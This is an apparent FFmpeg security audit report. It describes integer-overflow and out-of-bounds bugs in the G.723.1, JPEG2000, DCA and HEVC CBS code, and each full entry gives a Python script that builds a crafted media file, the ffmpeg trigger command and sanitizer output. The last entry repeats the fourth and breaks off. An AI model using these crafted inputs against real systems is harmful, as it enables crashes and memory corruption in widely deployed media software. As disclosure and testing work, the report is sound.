# FFmpeg Security Audit Report


## Bug1: Signed Integer Overflow in g723_1_parse() Leading to Out-of-Bounds Read

### Summary

In `libavcodec/g723_1_parser.c` line 41, `g723_1_parse()` computes `next = frame_size[buf[0] & 3] * FFMAX(1, avctx->ch_layout.nb_channels)` with no overflow guard. When a crafted Matroska container supplies `nb_channels = 178956971`, the type-0 frame multiplication `24 * 178956971 = 4294967304` overflows a signed 32-bit integer (undefined behavior, UBSAN-confirmed). For type-1 frames the wrapped result is `-715827876`; `ff_combine_frame()` receives this negative `next` value, sets `pc->overread_index` to a large negative offset, and the overread copy loop reads memory far outside the `ParseContext.buffer` heap allocation, causing an out-of-bounds read (CWE-125) that reliably crashes the process (DoS) and may leak heap contents.

### PoC

A Python script generates a minimal 167-byte Matroska file carrying a G.723.1 audio track with `nb_channels = 178956971` encoded in the EBML Channels element; `ffmpeg` with `-codec_whitelist none` is used to keep the oversized channel count in the parser context while still reaching the vulnerable multiply.

```python
#!/usr/bin/env python3
"""
PoC: Signed integer overflow in g723_1_parse() -> OOB read via ff_combine_frame()
Generates a crafted Matroska file and triggers the bug with ffmpeg.
"""

import struct, os

OUTPUT_FILE = "poc_g723_1_overflow.mkv"
NB_CHANNELS = 178956971  # 0x0AAAAAAB — causes signed int overflow in g723_1_parse()


def encode_ebml_id(id_int):
    if id_int <= 0xFF:           return bytes([id_int])
    elif id_int <= 0xFFFF:       return struct.pack('>H', id_int)
    elif id_int <= 0xFFFFFF:     return struct.pack('>I', id_int)[1:]
    else:                        return struct.pack('>I', id_int)

def encode_ebml_size(n):
    if n < 0x7F:          return bytes([0x80 | n])
    elif n < 0x3FFF:      return struct.pack('>H', 0x4000 | n)
    elif n < 0x1FFFFF:    return struct.pack('>I', 0x200000 | n)[1:]
    elif n < 0x0FFFFFFF:  return struct.pack('>I', 0x10000000 | n)
    else:                 return struct.pack('>Q', 0x0100000000000000 | n)

def make_uint_bytes(n):
    if n == 0: return b'\x00'
    return n.to_bytes((n.bit_length() + 7) // 8, 'big')

def ebml_elem(id_int, data):
    if isinstance(data, int):   data = make_uint_bytes(data)
    elif isinstance(data, str): data = data.encode('ascii')
    return encode_ebml_id(id_int) + encode_ebml_size(len(data)) + data

def ebml_float64(f):
    return struct.pack('>d', f)

# EBML / Matroska element IDs
EBML_ID_HEADER            = 0x1A45DFA3
EBML_ID_EBMLVERSION       = 0x4286
EBML_ID_EBMLREADVERSION   = 0x42F7
EBML_ID_EBMLMAXIDLENGTH   = 0x42F2
EBML_ID_EBMLMAXSIZELENGTH = 0x42F3
EBML_ID_DOCTYPE           = 0x4282
EBML_ID_DOCTYPEVERSION    = 0x4287
EBML_ID_DOCTYPEREADVERSION= 0x4285
MATROSKA_ID_SEGMENT       = 0x18538067
MATROSKA_ID_INFO          = 0x1549A966
MATROSKA_ID_TIMECODESCALE = 0x2AD7B1
MATROSKA_ID_TRACKS        = 0x1654AE6B
MATROSKA_ID_TRACKENTRY    = 0xAE
MATROSKA_ID_TRACKNUMBER   = 0xD7
MATROSKA_ID_TRACKUID      = 0x73C5
MATROSKA_ID_TRACKTYPE     = 0x83
MATROSKA_ID_TRACKFLAGLACING = 0x9C
MATROSKA_ID_CODECID       = 0x86
MATROSKA_ID_CODECPRIVATE  = 0x63A2
MATROSKA_ID_TRACKAUDIO    = 0xE1
MATROSKA_ID_AUDIOSAMPLINGFREQ = 0xB5
MATROSKA_ID_AUDIOCHANNELS = 0x9F
MATROSKA_ID_CLUSTER       = 0x1F43B675
MATROSKA_ID_CLUSTERTIMECODE = 0xE7
MATROSKA_ID_SIMPLEBLOCK   = 0xA3
EBML_UNKNOWN_SIZE = bytes([0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF])

# WAVEFORMATEX: G.723.1 codec tag, nChannels=0 (forces MKV demuxer to use EBML Channels)
waveformatex = struct.pack('<HHIIH', 0x0042, 0, 8000, 800, 24)

audio_inner = (ebml_elem(MATROSKA_ID_AUDIOSAMPLINGFREQ, ebml_float64(8000.0)) +
               ebml_elem(MATROSKA_ID_AUDIOCHANNELS, NB_CHANNELS))
audio_elem  = ebml_elem(MATROSKA_ID_TRACKAUDIO, audio_inner)

track_body = (ebml_elem(MATROSKA_ID_TRACKNUMBER, 1) +
              ebml_elem(MATROSKA_ID_TRACKUID, 1) +
              ebml_elem(MATROSKA_ID_TRACKTYPE, 2) +
              ebml_elem(MATROSKA_ID_TRACKFLAGLACING, 0) +
              ebml_elem(MATROSKA_ID_CODECID, "A_MS/ACM") +
              ebml_elem(MATROSKA_ID_CODECPRIVATE, waveformatex) +
              audio_elem)
tracks = ebml_elem(MATROSKA_ID_TRACKS, ebml_elem(MATROSKA_ID_TRACKENTRY, track_body))
info   = ebml_elem(MATROSKA_ID_INFO,   ebml_elem(MATROSKA_ID_TIMECODESCALE, 1000000))

# G.723.1 type-0 frame: first byte=0x00, low 2 bits=0 → frame_size[0]=24
g723_frame       = bytes(24)
simpleblock_data = bytes([0x81, 0x00, 0x00, 0x80]) + g723_frame
cluster = ebml_elem(MATROSKA_ID_CLUSTER,
                    ebml_elem(MATROSKA_ID_CLUSTERTIMECODE, 0) +
                    ebml_elem(MATROSKA_ID_SIMPLEBLOCK, simpleblock_data))

segment_body = info + tracks + cluster
segment = (encode_ebml_id(MATROSKA_ID_SEGMENT) + EBML_UNKNOWN_SIZE + segment_body)

header_body = (ebml_elem(EBML_ID_EBMLVERSION, 1) +
               ebml_elem(EBML_ID_EBMLREADVERSION, 1) +
               ebml_elem(EBML_ID_EBMLMAXIDLENGTH, 4) +
               ebml_elem(EBML_ID_EBMLMAXSIZELENGTH, 8) +
               ebml_elem(EBML_ID_DOCTYPE, "matroska") +
               ebml_elem(EBML_ID_DOCTYPEVERSION, 4) +
               ebml_elem(EBML_ID_DOCTYPEREADVERSION, 2))
header = ebml_elem(EBML_ID_HEADER, header_body)

with open(OUTPUT_FILE, 'wb') as f:
    f.write(header + segment)

print(f"[+] Generated {OUTPUT_FILE} ({os.path.getsize(OUTPUT_FILE)} bytes)")
print(f"[+] nb_channels={NB_CHANNELS}: 24*nb_channels={24*NB_CHANNELS} overflows int32")
```

```bash
# Step 1: generate the crafted MKV file
python3 poc_g723_1_overflow.py

# Step 2: trigger the overflow in g723_1_parse()
# -codec_whitelist 'none' keeps nb_channels in the parser avctx
# (avcodec_open2 fails before resetting ch_layout, so nb_channels stays at 178956971)
ffmpeg -codec_whitelist 'none' -i poc_g723_1_overflow.mkv -f null -
```

### Result

Running the above command against an ASAN+UBSAN build produces the following sanitizer report at the exact vulnerable line, confirming the signed integer overflow:

```
src/libavcodec/g723_1_parser.c:41:14: runtime error: signed integer overflow: 24 * 178956971 cannot be represented in type 'int'
```

The stream is parsed as `Audio: g723_1, 8000 Hz, 178956971 channels`, demonstrating that the oversized channel count reaches `g723_1_parse()` unchecked. In a release build (no sanitizers), the type-0 overflow wraps to `8` and a subsequent type-1 frame wraps to `-715827876`; `ff_combine_frame()` then sets `pc->overread_index` to that negative value and the overread copy loop performs an out-of-bounds read on the heap buffer, crashing the process (DoS) with potential for heap content disclosure.

<!-- REPORT_SOURCE: libavcodec_g723_1_parser_c#001 -->
<!-- DEDUP: g723_1_parse::CWE-190 -->

## Bug2: Signed Integer Overflow in JPEG2000 Encoder Packet Size Calculation

### Summary

In `libavcodec/j2kenc.c` at line 1482, `encode_frame()` computes the output packet buffer size as `avctx->width * avctx->height * 9 + FF_INPUT_BUFFER_MIN_SIZE` entirely in signed 32-bit integer arithmetic. For frames with dimensions such as 15448×15448, the intermediate product `238,640,704 × 9 = 2,147,766,336` exceeds INT32_MAX (2,147,483,647), invoking signed integer overflow — undefined behavior under the C standard (CWE-190). In the tested UBSan build the wrapped negative result is rejected by `ff_alloc_packet`, aborting encoding; in an optimized non-sanitized build the same UB could yield a small positive size (e.g., ~25 MB for 30000×16000 before that specific dimension is blocked elsewhere), potentially enabling a heap buffer overflow (CWE-122).

### PoC

A Python script generates a minimal 1×1 TIFF placeholder for documentation; the actual overflow trigger uses FFmpeg's rawvideo demuxer with `/dev/zero` to feed a 15448×15448 grayscale frame directly to the JPEG2000 encoder.

```python
#!/usr/bin/env python3
"""
PoC placeholder generator for the signed integer overflow in j2kenc.c:1482.
The actual overflow trigger is the ffmpeg command in the bash block below.
"""
import struct

OUTPUT = "vuln_001_input.tiff"

def write_minimal_tiff():
    num_entries = 12
    ifd_size = 2 + num_entries * 12 + 4
    data_offset = 8 + ifd_size   # 158
    bps_at  = data_offset        # 158
    xres_at = bps_at + 6         # 164
    yres_at = xres_at + 8        # 172
    pixel_at = yres_at + 8       # 180

    width, height, spp = 1, 1, 3
    entries = [
        struct.pack('<HHII', 256, 3, 1, width),
        struct.pack('<HHII', 257, 3, 1, height),
        struct.pack('<HHII', 258, 3, 3, bps_at),
        struct.pack('<HHII', 259, 3, 1, 1),
        struct.pack('<HHII', 262, 3, 1, 2),
        struct.pack('<HHII', 273, 4, 1, pixel_at),
        struct.pack('<HHII', 277, 3, 1, spp),
        struct.pack('<HHII', 278, 3, 1, height),
        struct.pack('<HHII', 279, 4, 1, width * height * spp),
        struct.pack('<HHII', 282, 5, 1, xres_at),
        struct.pack('<HHII', 283, 5, 1, yres_at),
        struct.pack('<HHII', 296, 3, 1, 2),
    ]

    data = bytearray()
    data += b'II' + struct.pack('<H', 42) + struct.pack('<I', 8)
    data += struct.pack('<H', num_entries)
    for e in entries:
        data += e
    data += struct.pack('<I', 0)          # no next IFD
    data += struct.pack('<HHH', 8, 8, 8) # BitsPerSample
    data += struct.pack('<II', 72, 1)    # XResolution 72/1
    data += struct.pack('<II', 72, 1)    # YResolution 72/1
    data += bytes([0xFF, 0xFF, 0xFF])    # 1x1 RGB pixel

    with open(OUTPUT, 'wb') as f:
        f.write(data)
    print(f"[+] Placeholder TIFF written: {OUTPUT}")
    print("[+] Overflow: 15448*15448*9 = 2,147,766,336 > INT32_MAX at j2kenc.c:1482")

if __name__ == '__main__':
    write_minimal_tiff()
```

```bash
# (Optional) generate placeholder TIFF for documentation
python3 vuln_001_gen.py

# Trigger signed integer overflow in the JPEG2000 encoder.
# Uses /dev/zero as rawvideo source — no large disk file needed.
# NOTE: ASAN+UBSan overhead means this may take ~60 seconds.
ffmpeg \
  -probesize 32 \
  -f rawvideo -video_size 15448x15448 -pixel_format gray8 -framerate 1 -i /dev/zero \
  -c:v jpeg2000 -tile_width 32768 -tile_height 32768 \
  -frames:v 1 -f null -
```

### Result

Running on a UBSan-enabled build triggers the signed integer overflow at `j2kenc.c:1482:70`:

```
src/libavcodec/j2kenc.c:1482:70: runtime error: signed integer overflow: 238640704 * 9 cannot be represented in type 'int'
[jpeg2000 @ 0x519000011380] Invalid minimum required packet size -2147184576 (max allowed is 2147483583)
[vost#0:0/jpeg2000 @ ...] Error submitting video frame to the encoder
[vost#0:0/jpeg2000 @ ...] Error flushing encoder: Invalid argument
```

The expression `15448 × 15448 × 9 = 2,147,766,336` overflows int32, wrapping to `-2,147,184,576`. The current build's `ff_alloc_packet` rejects the negative size and aborts safely, but the arithmetic constitutes confirmed undefined behavior (CWE-190) that an optimizing compiler may transform arbitrarily. Without the downstream size guard, the same overflow path would produce a severely undersized allocation and enable a heap buffer overflow (CWE-122). The fix is to cast at least one operand to `int64_t` before multiplication.

<!-- REPORT_SOURCE: libavcodec_j2kenc_c#001 -->
<!-- DEDUP: encode_frame::CWE-190 -->

## Bug3: Global Buffer Overflow (OOB Read) on dca2wav[] in ff_dca_set_channel_layout

### Summary

In `ff_dca_set_channel_layout()` (libavcodec/dcadec.c, lines 64–74), the `CHANNEL_ORDER_CODED` path iterates `dca_ch` from 0 to `DCA_SPEAKER_COUNT-1` (31) and indexes into `dca2wav_norm[]` or `dca2wav_wide[]`, which each have only 28 elements. When a crafted DCA file with an XXCH extension sets `xxch_spkr_mask` bits 28–29, the combined `ch_mask` causes `dca2wav[28]` and `dca2wav[29]` to be read out-of-bounds. The read bytes are written into `avctx->ch_layout.u.map[].id`, producing incorrect channel mapping and constituting a global-buffer-overflow memory safety violation.

### PoC

A Python script generates a minimal crafted DCA bitstream (core frame + EXSS/XXCH extension with `xxch_spkr_mask` bits 28–29 set), then ffmpeg is invoked with `-channel_order coded` to trigger the out-of-bounds read in the channel layout path.

```python
#!/usr/bin/env python3
"""
PoC for OOB Read on dca2wav[] in ff_dca_set_channel_layout.

Generates a crafted DCA bitstream: a minimal MONO core frame followed by
an EXSS/XXCH extension whose xxch_spkr_mask has bits 28 and 29 set.
With -channel_order coded, ff_dca_set_channel_layout reads dca2wav[28]
and dca2wav[29] out-of-bounds (arrays are size 28).
"""

import os, struct

class BitBuilder:
    def __init__(self, size):
        self.buf = bytearray(size)
        self.pos = 0

    def write_bits(self, value, nbits):
        for i in range(nbits - 1, -1, -1):
            bit = (value >> i) & 1
            byte_idx = self.pos >> 3
            bit_mask = 1 << (7 - (self.pos & 7))
            if bit:
                self.buf[byte_idx] |= bit_mask
            else:
                self.buf[byte_idx] &= ~bit_mask
            self.pos += 1

    def seek_to_bit(self, bit_pos):
        if bit_pos < self.pos:
            raise ValueError(f"Cannot seek backward {bit_pos} < {self.pos}")
        self.pos = bit_pos

    def cur(self):
        return self.pos

    def get_bytes(self):
        return bytes(self.buf)


CORE_FRAME_SIZE = 512

def build_core_frame():
    b = BitBuilder(CORE_FRAME_SIZE)
    b.write_bits(0x7FFE8001, 32)  # DCA_SYNCWORD_CORE_BE
    b.write_bits(1,  1)   # normal_frame
    b.write_bits(31, 5)   # deficit_samples -> 32
    b.write_bits(0,  1)   # crc_present = 0
    b.write_bits(7,  7)   # npcmblocks -> 8
    b.write_bits(CORE_FRAME_SIZE - 1, 14)
    b.write_bits(0,  6)   # audio_mode = 0 (MONO)
    b.write_bits(13, 4)   # sr_code -> 48000 Hz
    b.write_bits(0,  5)   # br_code
    b.write_bits(0,  1)   # reserved
    b.write_bits(0,  1)   # drc_present
    b.write_bits(0,  1)   # ts_present
    b.write_bits(0,  1)   # aux_present
    b.write_bits(0,  1)   # hdcd_master
    b.write_bits(0,  3)   # ext_audio_type
    b.write_bits(0,  1)   # ext_audio_present = 0 (avoids mandatory CSS CRC)
    b.write_bits(0,  1)   # sync_ssf
    b.write_bits(0,  2)   # lfe_present
    b.write_bits(0,  1)   # predictor_history
    b.write_bits(0,  1)   # filter_perfect
    b.write_bits(0,  4)   # encoder_rev
    b.write_bits(0,  2)   # copy_hist
    b.write_bits(0,  3)   # pcmr_code
    b.write_bits(0,  1)   # sumdiff_front
    b.write_bits(0,  1)   # sumdiff_surround
    b.write_bits(0,  4)   # dn_code
    # Coding header
    b.write_bits(0,  4)   # nsubframes -> 1
    b.write_bits(0,  3)   # nchannels -> 1
    b.write_bits(0,  5)   # nsubbands[0] -> 2
    b.write_bits(1,  5)   # subband_vq_start[0] -> 2
    b.write_bits(0,  3)   # joint_intensity_index[0]
    b.write_bits(0,  2)   # transition_mode_sel[0]
    b.write_bits(0,  3)   # scale_factor_sel[0]
    b.write_bits(5,  3)   # bit_allocation_sel[0] = 5
    b.write_bits(1, 1); b.write_bits(3, 2); b.write_bits(3, 2)
    b.write_bits(3, 2); b.write_bits(3, 2)
    b.write_bits(7, 3); b.write_bits(7, 3); b.write_bits(7, 3)
    b.write_bits(7, 3); b.write_bits(7, 3)
    # Subframe header
    b.write_bits(0,  2)   # nsubsubframes -> 1
    b.write_bits(0,  3)
    b.write_bits(0,  1); b.write_bits(0, 1)   # prediction_mode bands 0,1
    b.write_bits(0,  4); b.write_bits(0, 4)   # bit_allocation bands 0,1 = 0
    b.write_bits(0xffff, 16)  # DSYNC
    return b.get_bytes()


XXCH_SIZE = 100

def build_xxch_data():
    b = BitBuilder(XXCH_SIZE)
    b.write_bits(0x47004A03, 32)  # DCA_SYNCWORD_XXCH
    b.write_bits(11, 6)           # header_size -> 12 bytes
    b.write_bits(0,  1)           # xxch_crc_present = 0
    b.write_bits(31, 5)           # xxch_mask_nbits -> 32
    b.write_bits(0,  2)           # xxch_nchsets -> 1
    b.write_bits(39, 14)          # xxch_frame_size -> 40 bytes
    b.write_bits(0x00000001, 32)  # xxch_core_mask = 0x01 (MONO)
    b.seek_to_bit(96)             # header_size * 8
    # Channel set header
    b.write_bits(19, 7)           # channel-set header_size -> 20 bytes
    b.write_bits(1,  3)           # nchannels -> 2
    # xxch_spkr_mask: raw 26-bit field = 0xC00000 -> shifted left 6 = bits 28,29 set
    b.write_bits(0xC00000, 26)
    b.write_bits(0,  1)           # downmix_present = 0
    b.write_bits(0,  5); b.write_bits(0, 5)   # nsubbands ch1, ch2
    b.write_bits(1,  5); b.write_bits(1, 5)   # subband_vq_start ch1, ch2
    b.write_bits(0,  3); b.write_bits(0, 3)   # joint_intensity_index
    b.write_bits(0,  2); b.write_bits(0, 2)   # transition_mode_sel
    b.write_bits(0,  3); b.write_bits(0, 3)   # scale_factor_sel
    b.write_bits(5,  3); b.write_bits(5, 3)   # bit_allocation_sel = 5
    for _ in range(2):
        b.write_bits(1, 1); b.write_bits(3, 2); b.write_bits(3, 2)
        b.write_bits(3, 2); b.write_bits(3, 2)
        b.write_bits(7, 3); b.write_bits(7, 3); b.write_bits(7, 3)
        b.write_bits(7, 3); b.write_bits(7, 3)
    b.seek_to_bit(256)            # header_pos2 + header_size2*8
    # Subframe header + audio
    b.write_bits(0, 1); b.write_bits(0, 1)   # prediction_mode ch1
    b.write_bits(0, 1); b.write_bits(0, 1)   # prediction_mode ch2
    b.write_bits(0, 4); b.write_bits(0, 4)   # bit_allocation ch1
    b.write_bits(0, 4); b.write_bits(0, 4)   # bit_allocation ch2
    b.write_bits(0xffff, 16)  # DSYNC
    return b.get_bytes()


EXSS_HEADER_SIZE = 30
EXSS_ASSET_SIZE  = XXCH_SIZE
EXSS_TOTAL_SIZE  = EXSS_HEADER_SIZE + EXSS_ASSET_SIZE

def build_exss(xxch_bytes):
    b = BitBuilder(EXSS_TOTAL_SIZE)
    b.write_bits(0x64582025, 32)                     # DCA_SYNCWORD_SUBSTREAM
    b.write_bits(0,   8)                              # user defined
    b.write_bits(0,   2)                              # exss_index
    b.write_bits(0,   1)                              # wide_hdr = 0
    b.write_bits(EXSS_HEADER_SIZE - 1, 8)
    b.write_bits(EXSS_TOTAL_SIZE - 1, 16)
    b.write_bits(0,   1)                              # static_fields_present = 0
    b.write_bits(EXSS_ASSET_SIZE - 1, 16)
    descr_pos_bits = b.cur()
    b.write_bits(7,   9)                              # descr_size -> 8 bytes
    b.write_bits(0,   3)                              # asset_index
    b.write_bits(0,   1)                              # drc_present
    b.write_bits(0,   1)                              # dialog_norm
    b.write_bits(0,   2)                              # coding_mode = 0
    b.write_bits(0x040, 12)                           # extension_mask = DCA_EXSS_XXCH
    b.write_bits(XXCH_SIZE - 1, 14)                  # xxch_size
    b.seek_to_bit(descr_pos_bits + 8 * 8)
    b.seek_to_bit(EXSS_HEADER_SIZE * 8)
    for i, bv in enumerate(xxch_bytes):
        b.buf[EXSS_HEADER_SIZE + i] = bv
    return b.get_bytes()


def main():
    output_path = 'poc_input.dca'
    core = build_core_frame()
    xxch = build_xxch_data()
    exss = build_exss(xxch)
    data = core + exss
    with open(output_path, 'wb') as f:
        f.write(data)
    print(f"[+] Written {len(data)} bytes to {output_path}")

if __name__ == '__main__':
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/ffmpeg -f dts -channel_order coded -i poc_input.dca -f null -
cat asan.log.*
```

### Result

ASAN detects a `global-buffer-overflow` (READ of size 1) in `ff_dca_set_channel_layout()` at libavcodec/dcadec.c, reported as "0 bytes after global variable 'dca2wav_norm' of size 28". The call stack confirms the path: `dcadec_decode_frame()` → `ff_dca_core_filter_frame()` → `ff_dca_set_channel_layout()`. The bug is consistently reproduced across multiple runs and the process aborts with the ASAN report.

<!-- REPORT_SOURCE: libavcodec_dcadec_c#002 -->
<!-- DEDUP: ff_dca_set_channel_layout::CWE-125 -->

## Bug4: Off-by-one OOB Write in HEVC SEI pic_timing num_decoding_units_minus1 Loop

### Summary

In `libavcodec/cbs_h265_syntax_template.c`, `FUNC(sei_pic_timing)()` validates `num_decoding_units_minus1` against the upper bound `HEVC_MAX_SLICE_SEGMENTS` (600), but the fixed-size array `num_nalus_in_du_minus1` is declared with exactly 600 elements (valid indices 0–599). When `num_decoding_units_minus1` equals 600, the loop `for (i = 0; i <= current->num_decoding_units_minus1; i++)` writes to index 600 — one past the end of the array — constituting a CWE-787 out-of-bounds write. The write lands inside the adjacent struct field `du_cpb_removal_delay_increment_minus1[0]`, corrupting it with an attacker-controlled two-byte value and potentially causing downstream data corruption or DoS.

### PoC

A Python script constructs a minimal HEVC raw bitstream (`poc_input.hevc`) containing a crafted SEI prefix NAL unit with a `pic_timing` message setting `num_decoding_units_minus1=600`; the bug is triggered when `ffmpeg` processes the file through the `trace_headers` bitstream filter, which invokes the CBS HEVC parser.

```python
#!/usr/bin/env python3
"""
PoC: Off-by-one OOB Write in FFmpeg HEVC CBS SEI pic_timing parsing.
Triggers FUNC(sei_pic_timing)() to write num_nalus_in_du_minus1[600] OOB.
Requires: ffmpeg built with UBSan/ASAN (-fsanitize=address,undefined).
Run: python3 gen.py
     ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
       ./ffmpeg -f hevc -i poc_input.hevc -c:v copy -bsf:v trace_headers -f null -
"""

import struct, sys, os

class BitWriter:
    def __init__(self):
        self._bits = []
    def write_bit(self, b):
        self._bits.append(b & 1)
    def write_bits(self, value, n):
        for i in range(n - 1, -1, -1):
            self._bits.append((value >> i) & 1)
    def write_ue(self, value):
        if value == 0:
            self._bits.append(1)
            return
        x = value + 1
        length = x.bit_length()
        for _ in range(length - 1):
            self._bits.append(0)
        for i in range(length - 1, -1, -1):
            self._bits.append((x >> i) & 1)
    def write_se(self, value):
        self.write_ue(2 * value - 1) if value > 0 else self.write_ue(-2 * value)
    def write_rbsp_trailing(self):
        self._bits.append(1)
        while len(self._bits) % 8 != 0:
            self._bits.append(0)
    def to_bytes(self):
        bits = list(self._bits)
        while len(bits) % 8 != 0:
            bits.append(0)
        result = bytearray()
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | bits[i + j]
            result.append(byte)
        return bytes(result)
    def bit_count(self):
        return len(self._bits)

def apply_emulation_prevention(data):
    result = bytearray()
    zero_count = 0
    for b in data:
        if zero_count == 2 and b in (0x00, 0x01, 0x02, 0x03):
            result.append(0x03)
            zero_count = 0
        result.append(b)
        zero_count = (zero_count + 1) if b == 0x00 else 0
    return bytes(result)

def make_nal(nal_type, rbsp_bytes):
    header = bytes([nal_type << 1, 0x01])
    return b'\x00\x00\x00\x01' + header + apply_emulation_prevention(rbsp_bytes)

def write_profile_tier_level(bw):
    bw.write_bits(0, 2); bw.write_bit(0); bw.write_bits(1, 5)
    bw.write_bits(0x40000000, 32)
    bw.write_bit(1); bw.write_bit(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_bits(0, 43); bw.write_bit(0); bw.write_bits(30, 8)

def write_sub_layer_hrd_parameters(bw):
    bw.write_ue(0); bw.write_ue(0); bw.write_ue(0); bw.write_ue(0); bw.write_bit(0)

def write_hrd_parameters(bw):
    bw.write_bit(1); bw.write_bit(0)          # nal=1, vcl=0
    bw.write_bit(1); bw.write_bits(0, 8)      # sub_pic=1, tick_divisor_minus2=0
    bw.write_bits(15, 5); bw.write_bit(1)     # du_delay_len=15, sub_pic_cpb_in_sei=1 (KEY)
    bw.write_bits(0, 5)                        # dpb_output_delay_du_len=0
    bw.write_bits(0, 4); bw.write_bits(0, 4); bw.write_bits(0, 4)
    bw.write_bits(0, 5); bw.write_bits(0, 5); bw.write_bits(0, 5)
    bw.write_bit(0); bw.write_bit(0); bw.write_bit(1)
    write_sub_layer_hrd_parameters(bw)

def build_vps():
    bw = BitWriter()
    bw.write_bits(0, 4); bw.write_bit(1); bw.write_bit(1)
    bw.write_bits(0, 6); bw.write_bits(0, 3); bw.write_bit(1)
    bw.write_bits(0xFFFF, 16)
    write_profile_tier_level(bw)
    bw.write_bit(0); bw.write_ue(1); bw.write_ue(0); bw.write_ue(0)
    bw.write_bits(0, 6); bw.write_ue(0)
    bw.write_bit(0); bw.write_bit(0)
    bw.write_rbsp_trailing()
    return bw.to_bytes()

def build_sps():
    bw = BitWriter()
    bw.write_bits(0, 4); bw.write_bits(0, 3); bw.write_bit(1)
    write_profile_tier_level(bw)
    bw.write_ue(0); bw.write_ue(1)
    bw.write_ue(64); bw.write_ue(64); bw.write_bit(0)
    bw.write_ue(0); bw.write_ue(0); bw.write_ue(4)
    bw.write_bit(0); bw.write_ue(1); bw.write_ue(0); bw.write_ue(0)
    bw.write_ue(0); bw.write_ue(3); bw.write_ue(0); bw.write_ue(3)
    bw.write_ue(0); bw.write_ue(0)
    bw.write_bit(0); bw.write_bit(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_ue(0); bw.write_bit(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_bit(1)  # vui_parameters_present_flag
    bw.write_bit(0); bw.write_bit(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_bit(0); bw.write_bit(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_bit(1)  # vui_timing_info_present_flag
    bw.write_bits(1, 32); bw.write_bits(30, 32); bw.write_bit(0)
    bw.write_bit(1)  # vui_hrd_parameters_present_flag
    write_hrd_parameters(bw)
    bw.write_bit(0); bw.write_bit(0)
    bw.write_rbsp_trailing()
    return bw.to_bytes()

def build_pps():
    bw = BitWriter()
    bw.write_ue(0); bw.write_ue(0)
    bw.write_bit(0); bw.write_bit(0); bw.write_bits(0, 3)
    bw.write_bit(0); bw.write_bit(0)
    bw.write_ue(0); bw.write_ue(0); bw.write_se(0)
    bw.write_bit(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_se(0); bw.write_se(0); bw.write_bit(0)
    bw.write_bit(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_bit(0); bw.write_bit(0)
    bw.write_bit(1); bw.write_bit(1); bw.write_bit(0); bw.write_bit(0)
    bw.write_se(0); bw.write_se(0)
    bw.write_bit(0); bw.write_bit(0); bw.write_ue(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_rbsp_trailing()
    return bw.to_bytes()

def build_sei_prefix():
    bw = BitWriter()
    bw.write_bits(0, 1)   # au_cpb_removal_delay_minus1 (1 bit)
    bw.write_bits(0, 1)   # pic_dpb_output_delay (1 bit)
    bw.write_bits(0, 1)   # pic_dpb_output_du_delay (1 bit)
    bw.write_ue(600)      # num_decoding_units_minus1 = 600 ← OOB trigger
    bw.write_bit(1)       # du_common_cpb_removal_delay_flag
    bw.write_bits(0, 16)  # du_common_cpb_removal_delay_increment_minus1
    for i in range(601):  # loop writes index 600 OOB
        bw.write_ue(0)
    payload = bw.to_bytes()
    sei_rbsp = bytearray()
    sei_rbsp.append(1)               # SEI type: pic_timing
    sei_rbsp.append(len(payload))    # payload size
    sei_rbsp.extend(payload)
    sei_rbsp.append(0x80)            # RBSP trailing
    return bytes(sei_rbsp)

def main():
    out = 'poc_input.hevc'
    bitstream = bytearray()
    bitstream.extend(make_nal(32, build_vps()))        # VPS
    bitstream.extend(make_nal(33, build_sps()))        # SPS
    bitstream.extend(make_nal(34, build_pps()))        # PPS
    bitstream.extend(make_nal(39, build_sei_prefix())) # SEI prefix (pic_timing)
    bitstream.extend(make_nal(19, bytes([0xA0, 0x00])))# IDR stub
    bitstream.extend(make_nal(35, bytes([0x10])))      # AUD (flushes packet)
    with open(out, 'wb') as f:
        f.write(bitstream)
    print(f'[+] Written {len(bitstream)} bytes to {out}')
    print('[+] SEI pic_timing: num_decoding_units_minus1=600 → OOB write at index 600')

if __name__ == '__main__':
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  ./build_test/ffmpeg -f hevc -i poc_input.hevc -c:v copy -bsf:v trace_headers -f null -
cat asan.log.*
```

### Result

Running the PoC triggers UBSan in `FUNC(sei_pic_timing)()` during CBS parsing of the crafted SEI prefix NAL unit via the `trace_headers` bitstream filter: `cbs_h265_syntax_template.c:2005:17: runtime error: index 600 out of bounds for type 'uint16_t [600]'`. The out-of-bounds write at `num_nalus_in_du_minus1[600]` falls within the same heap-allocated `H265RawSEIPicTiming` struct, overwriting the low two bytes of `du_cpb_removal_delay_increment_minus1[0]` with an attacker-controlled value and confirming CWE-787.

<!-- REPORT_SOURCE: libavcodec_cbs_h265_c#001 -->
<!-- DEDUP: FUNC::CWE-787 -->

## Bug5: Off-by-One OOB Heap Write in HEVC CBS sei_pic_timing via num_decoding_units_minus1

### Summary

In `cbs_h265_syntax_template.c`, the function `cbs_h265_read_sei_pic_timing()` reads `num_decoding_units_minus1` with an upper bound of `HEVC_MAX_SLICE_SEGMENTS` (600). The subsequent loop `for (i = 0; i <= current->num_decoding_units_minus1; i++)` iterates up to i=600 and writes `num_nalus_in_du_minus1[i]`, but `H265RawSEIPicTiming.num_nalus_in_du_minus1` is declared with exactly 600 elements (valid indices 0–599). When an attacker sets `num_decoding_units_minus1=600`, the write at index 600 is one element past the end of the heap-allocated array, corrupting adjacent heap memory.

### PoC

A Python script generates a minimal HEVC Annex-B bitstream (VPS + SPS with sub-picture HRD timing parameters + PPS + Prefix SEI containing a `pic_timing` message with `num_decoding_units_minus1=600` + IDR slice), saved as `poc_input.h265`, which is then passed to `ffmpeg` via the `trace_headers` bitstream filter to trigger CBS parsing and the out-of-bounds write.

```python
#!/usr/bin/env python3
"""
PoC: Off-by-One OOB Heap Write in HEVC CBS sei_pic_timing
Generates poc_input.h265 — a minimal HEVC Annex-B bitstream that triggers
